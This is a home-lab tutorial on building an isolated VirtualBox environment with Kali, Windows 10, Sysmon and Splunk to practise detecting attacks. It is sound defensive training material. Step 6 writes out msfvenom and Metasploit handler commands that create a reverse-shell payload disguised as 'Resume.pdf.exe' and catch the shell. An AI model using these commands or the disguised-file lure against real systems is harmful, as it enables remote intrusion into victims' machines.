# 🏠 Cybersecurity Home Lab

A step-by-step guide to building and practicing in your own safe cybersecurity environment.  
This project demonstrates how to set up a home lab using **VirtualBox**, simulate attacks from **Kali**, collect endpoint telemetry with **Sysmon**, and analyze it in **Splunk**.

---

## Table of Contents

- [Lab Setup Overview](#lab-setup-overview)
- [Step 1 – Create the Virtual Machines](#step-1--create-the-virtual-machines)
- [Step 2 – Verify Connectivity](#step-2--verify-connectivity)
- [Step 3 – Install Splunk on Windows](#step-3--install-splunk-on-windows)
- [Step 4 – Install and Configure Sysmon](#step-4--install-and-configure-sysmon)
- [Step 5 – Configure Splunk to Ingest Logs](#step-5--configure-splunk-to-ingest-logs)
- [Step 6 – Simulate an Attack (Kali → Windows)](#step-6--simulate-an-attack-kali--windows)
- [Step 7 – Analyze in Splunk](#step-7--analyze-in-splunk)
- [Final Results](#final-results)
- [Next Steps](#next-steps)
- [References](#references)

---

## Lab Setup Overview

- **Hypervisor**: VirtualBox  
- **Operating Systems**:  
  - Kali Linux (Attacker) – `192.168.20.11`  
  - Windows 10 (Victim) – `192.168.20.10`  
- **Network Mode**: Internal Network (isolated; no internet)  
- **Tools Installed**:  
  - Sysmon (on Windows)  
  - Splunk Enterprise (on Windows)  
  - Splunk Add-on for Sysmon (manual .spl upload)  
  - Metasploit Framework (on Kali)

---

## Step 1 – Create the Virtual Machines

1. Install **VirtualBox** on your host.  
2. Create two VMs:
   - **Kali Linux** (attacker)
   - **Windows 10** (victim)
3. Set **Network Adapter** to `Internal Network` for both VMs.  
4. Assign static IPs:
   - Windows → `192.168.20.10`
   - Kali → `192.168.20.11`

> Tip: After installing Windows from ISO, remove the ISO from the virtual CD drive (Settings → Storage) so it boots from the disk and doesn’t re-run setup.

---

## Step 2 – Verify Connectivity

From **Kali**, ping Windows:

```bash
ping 192.168.20.10
```

From **Windows**, ping Kali:

```powershell
ping 192.168.20.11
```

> If ping from Kali fails, enable the Windows Firewall rule: **File and Printer Sharing (Echo Request - ICMPv4-In)**.

---

## Step 3 – Install Splunk on Windows

1. Download **Splunk Enterprise** on the host, copy into the VM (Shared Folders/USB).  
2. Install with defaults; set admin credentials.  
3. Start Splunk and open locally in the VM:

```
http://localhost:8000
```

---

## Step 4 – Install and Configure Sysmon

1. Download **Sysmon** on the host and copy to the Windows VM.  
2. (Recommended) Use a config XML (SwiftOnSecurity or a minimal lab config).  
3. Install Sysmon (Admin PowerShell):

```powershell
Sysmon64.exe -accepteula -i C:\Tools\sysmonconfig.xml
```

4. Verify events appear in Event Viewer:  
   **Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**

---

## Step 5 – Configure Splunk to Ingest Logs

1. Create an index **endpoint** in Splunk (Settings → Indexes → New Index).  
2. Create a small app to hold your inputs (recommended):

Create file:
```
C:\Program Files\Splunk\etc\apps\TA-lab-win\local\inputs.conf
```

Put this content inside:

```ini
[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = endpoint
renderXml = true

[WinEventLog://Security]
disabled = 0
index = endpoint

[WinEventLog://System]
disabled = 0
index = endpoint

[WinEventLog://Application]
disabled = 0
index = endpoint

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = 0
index = endpoint

[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
disabled = 0
index = endpoint
```

3. Restart Splunk service:

```powershell
net stop splunkd
net start splunkd
```

4. Verify ingestion:

```spl
index=endpoint | stats count by sourcetype
```

You should see: `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` (and others you enabled).

---

## Step 6 – Simulate an Attack (Kali → Windows)

**On Kali – generate payload (64-bit, reverse TCP):**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe
```

**Start handler in Metasploit:**

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.20.11
set LPORT 4444
run
```

**Deliver & execute** `Resume.pdf.exe` on the Windows VM (via Shared Folder/USB).  
You should see a **meterpreter session** open on Kali.

> Only run the payload inside your isolated VM. Do not execute on your host.

---

## Step 7 – Analyze in Splunk

**A) Network callbacks (Sysmon Event ID 3):**

```spl
index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 dest_ip=192.168.20.11
```

**B) Malicious process creation (Sysmon Event ID 1):**

```spl
index=endpoint sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\\Resume.pdf.exe"
```

**C) Quick sanity – ports seen:**

```spl
index=endpoint EventCode=3 | stats count by dest_port | sort - count
```

You should observe an outbound connection to your Kali machine on **port 4444** and a process creation event for `Resume.pdf.exe` (often followed by `cmd.exe`).

---

## Final Results

- **Attack simulation**: Kali generated a msfvenom payload and received a reverse shell from Windows.  
- **Detection**: Sysmon captured process creation (ID 1) and network connections (ID 3).  
- **Analysis**: Splunk searches surfaced the execution of `Resume.pdf.exe` and the callback to `192.168.20.11:4444`.

This lab demonstrates an end-to-end **attack → detect → analyze** workflow.

---

## Next Steps

- Install the **Splunk Add-on for Sysmon** (offline .spl) for richer field extraction.  
- Add a **dashboard** with panels for EventCode=1 and EventCode=3.  
- Expand the lab: honeypot (Cowrie), IDS (Zeek/Suricata), SIEM correlation, SOAR automation.

---

## References

- Sysmon: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon  
- Sysmon Configs: https://github.com/SwiftOnSecurity/sysmon-config  
- Splunk Docs: https://docs.splunk.com/  
- Metasploit: https://www.metasploit.com/
